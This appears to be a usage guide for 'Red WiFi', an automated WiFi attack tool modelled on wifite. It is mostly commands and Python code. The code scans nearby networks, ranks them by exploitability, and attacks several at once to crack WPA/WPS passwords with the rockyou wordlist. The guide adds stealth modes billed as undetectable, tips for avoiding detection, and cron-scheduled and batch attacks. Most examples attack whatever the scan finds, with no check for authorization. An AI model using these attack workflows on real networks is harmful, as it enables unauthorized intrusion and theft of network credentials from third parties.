# Wifite-Style Automation Guide

Complete guide to using Red WiFi's wifite-style automated attack system.

## Overview

Red WiFi includes a wifite-style automation layer that simplifies WiFi penetration testing. This guide shows how to use automated attacks effectively.

## One-Command Attack

The simplest way to launch an attack:

```bash
red-wifi auto --interface wlan0
```

This launches the interactive menu where you can:
1. Scan networks
2. Select attack mode
3. Choose target
4. Execute attack automatically

## Interactive Menu

```bash
red-wifi auto --interface wlan0
```

Shows:
```
╔════════════════════════════════════════════════════╗
║  RED WIFI AUTOMATED ATTACK MENU                    ║
╠════════════════════════════════════════════════════╣
║  1. Scan Networks
║  2. Select Attack Mode  
║  3. Launch Automated Attack
║  4. View Attack Results
║  5. Save Session
║  0. Exit
╚════════════════════════════════════════════════════╝
```

## Command-Line Arguments

### Basic Usage

```bash
# Scan only
red-wifi scan --interface wlan0

# Auto attack (interactive)
red-wifi auto --interface wlan0

# Specific target
red-wifi auto --interface wlan0 --target AA:BB:CC:DD:EE:FF

# Custom wordlist
red-wifi auto --interface wlan0 --wordlist /opt/wordlists/rockyou.txt
```

### Attack Mode Selection

```bash
# Passive (stealthy, slow)
red-wifi auto --interface wlan0 --mode passive

# Aggressive (balanced, recommended)
red-wifi auto --interface wlan0 --mode aggressive

# Relentless (fast, obvious)
red-wifi auto --interface wlan0 --mode relentless

# Stealth (slow, hidden)
red-wifi auto --interface wlan0 --mode stealth
```

### Strategy Selection

```bash
# WPA/WPA2 only
red-wifi auto --interface wlan0 --strategy wpa

# WPS only
red-wifi auto --interface wlan0 --strategy wps

# Both (hybrid)
red-wifi auto --interface wlan0 --strategy hybrid

# Everything
red-wifi auto --interface wlan0 --strategy all
```

## Python API

### Automated Multi-Target Attack

```python
from red_wifi import WiFiPentestFramework, AutomatedAttacker, AttackMode

# Initialize
framework = WiFiPentestFramework("wlan0")
framework.initialize()

# Scan networks
networks = framework.scan_networks(duration=30)

# Setup attacker
attacker = AutomatedAttacker(framework)

# Get top 5 targets ranked by exploitability
ranked = attacker.rank_targets(networks)
targets = [net for net, _ in ranked[:5]]

# Execute attacks
results = attacker.multi_target_attack(
    targets,
    mode=AttackMode.AGGRESSIVE,
    wordlist="rockyou.txt"
)

# Process results
for result in results:
    if result.success:
        print(f"✓ {result.target.ssid}: {result.password}")
    else:
        print(f"✗ {result.target.ssid}: Failed")
```

### Target Ranking and Selection

```python
from red_wifi import AutomatedAttacker

attacker = AutomatedAttacker(framework)

# Rank all targets
ranked = attacker.rank_targets(networks)

# Print top targets
for i, (network, score) in enumerate(ranked[:10], 1):
    print(f"{i:2}. {network.ssid:20} Score: {score:6.1f}")

# Select specific targets
high_value = [net for net, score in ranked if score >= 50]
```

### Custom Attack Workflows

```python
from red_wifi import *

def complete_wifi_assessment(interface):
    """Complete WiFi security assessment workflow."""
    
    # 1. Initialize
    framework = WiFiPentestFramework(interface)
    framework.initialize()
    
    # 2. Scan
    print("[*] Scanning networks...")
    networks = framework.scan_networks(duration=30)
    
    # 3. Analyze
    print("[*] Analyzing security...")
    analyzer = EncryptionAnalyzer(framework.logger)
    analysis = analyzer.analyze_network_security(networks)
    
    # 4. Print summary
    print(f"\nSecurity Summary:")
    print(f"  Critical: {analysis['critical_networks']}")
    print(f"  High: {analysis['high_risk_networks']}")
    print(f"  Medium: {analysis['medium_risk_networks']}")
    print(f"  Secure: {analysis['secure_networks']}")
    
    # 5. Attack if authorized
    if input("\nProceed with attacks? (y/N) ") == 'y':
        attacker = AutomatedAttacker(framework)
        ranked = attacker.rank_targets(networks)
        targets = [net for net, _ in ranked[:3]]
        
        results = attacker.multi_target_attack(
            targets,
            mode=AttackMode.AGGRESSIVE,
            wordlist="rockyou.txt"
        )
        
        # 6. Report
        framework.session_data['assessment'] = analysis
        framework.session_data['attack_results'] = results
        framework.generate_report("json")
        framework.generate_report("html")
```

## Attack Execution Examples

### Example 1: Quick Assessment

```bash
#!/bin/bash
# Quick 5-minute WiFi security assessment

INTERFACE="wlan0"

echo "[*] Starting WiFi assessment..."
red-wifi scan --interface $INTERFACE --duration 60

echo "[*] Launching attacks..."
red-wifi auto --interface $INTERFACE --mode aggressive --strategy hybrid

echo "[*] Assessment complete"
```

### Example 2: Stealth Operation

```python
from red_wifi import *

framework = WiFiPentestFramework("wlan0")
framework.initialize()

networks = framework.scan_networks(30)
attacker = AutomatedAttacker(framework)

# Stealthy approach
results = attacker.multi_target_attack(
    networks[:3],
    mode=AttackMode.STEALTH,  # 20-30 min, undetectable
    strategy=AttackStrategy.HYBRID
)
```

### Example 3: Fast PoC

```bash
# Quick proof-of-concept (relentless mode)
red-wifi auto --interface wlan0 \
    --mode relentless \
    --target AA:BB:CC:DD:EE:FF \
    --wordlist rockyou.txt
```

## Results and Reporting

### View Attack Statistics

```python
stats = attacker.get_statistics()

print(f"Total Attacks: {stats['total_attacks']}")
print(f"Successful: {stats['successful']}")
print(f"Success Rate: {stats['success_rate']:.1f}%")
print(f"Total Time: {stats['total_duration']:.1f}s")
print(f"Average Per Attack: {stats['average_duration']:.1f}s")
```

### Save Results

```python
# Save as JSON
framework.save_session("assessment.json")

# Generate reports
framework.reporter.generate_json_report(
    framework.session_data,
    "report.json"
)

framework.reporter.generate_html_report(
    framework.session_data,
    "report.html"
)
```

### Export Results

```python
import json

# Read session
with open("session.json") as f:
    session = json.load(f)

# Process results
for result in session['attack_results']:
    if result['success']:
        network = result['target']['ssid']
        password = result['password']
        print(f"{network}: {password}")
```

## Advanced Automation

### Scheduled Assessments

```bash
#!/bin/bash
# Schedule daily WiFi assessment
# Add to crontab: 0 2 * * * /path/to/wifi_scan.sh

INTERFACE="wlan0"
DATE=$(date +%Y%m%d_%H%M%S)
OUTDIR="/home/user/wifi_assessments/$DATE"

mkdir -p "$OUTDIR"
cd "$OUTDIR"

# Run assessment
red-wifi scan --interface $INTERFACE --duration 30
red-wifi auto --interface $INTERFACE --mode aggressive

# Log completion
echo "Assessment complete at $(date)" >> /var/log/wifi_assessments.log
```

### Batch Processing

```python
#!/usr/bin/env python3
# Batch assess multiple targets

from red_wifi import *
import json
from datetime import datetime

targets = [
    ("Office-WiFi", "AA:BB:CC:DD:EE:FF"),
    ("Guest-WiFi", "11:22:33:44:55:66"),
    ("Building-B", "FF:EE:DD:CC:BB:AA"),
]

framework = WiFiPentestFramework("wlan0")
framework.initialize()

results = {}

for name, bssid in targets:
    print(f"[*] Assessing {name}...")
    
    attacker = AutomatedAttacker(framework)
    result = attacker.attack(
        WiFiNetwork(
            bssid=bssid,
            ssid=name,
            channel=6,
            rssi=-50,
            encryption="WPA2",
            band="2.4GHz"
        ),
        mode=AttackMode.AGGRESSIVE,
        wordlist="rockyou.txt"
    )
    
    results[name] = {
        'success': result.success,
        'password': result.password,
        'method': result.method,
        'duration': result.duration
    }

# Save results
with open(f"batch_results_{datetime.now().isoformat()}.json", 'w') as f:
    json.dump(results, f, indent=2)
```

## Optimization Tips

### For Speed
1. Use Relentless mode (1-2 min)
2. Use GPU cracking with hashcat
3. Use optimized wordlist
4. Target strongest signals first

### For Stealth  
1. Use Stealth mode (20-30 min)
2. Avoid repeated attempts
3. Spread attacks over time
4. Monitor for detection

### For Success
1. Use Aggressive mode (balanced)
2. Use large, comprehensive wordlist
3. Verify handshakes before cracking
4. Try multiple cracking methods

## Troubleshooting

### No targets found
```bash
# Verify scan results
red-wifi scan --interface wlan0 --duration 60

# Check monitor mode
iwconfig wlan0
```

### Attack fails on all targets
```bash
# Check adapter range/signal
red-wifi scan --interface wlan0

# Move closer to targets
# Or try different mode
```

### Cracking never completes
```bash
# Check password is in wordlist
# Try smaller wordlist for testing
# Verify handshake with cowpatty
```

---

For more information, see:
- [USAGE.md](USAGE.md) - Detailed command reference
- [ATTACK_MODES.md](ATTACK_MODES.md) - Mode explanations
- [FAQ.md](FAQ.md) - Common questions
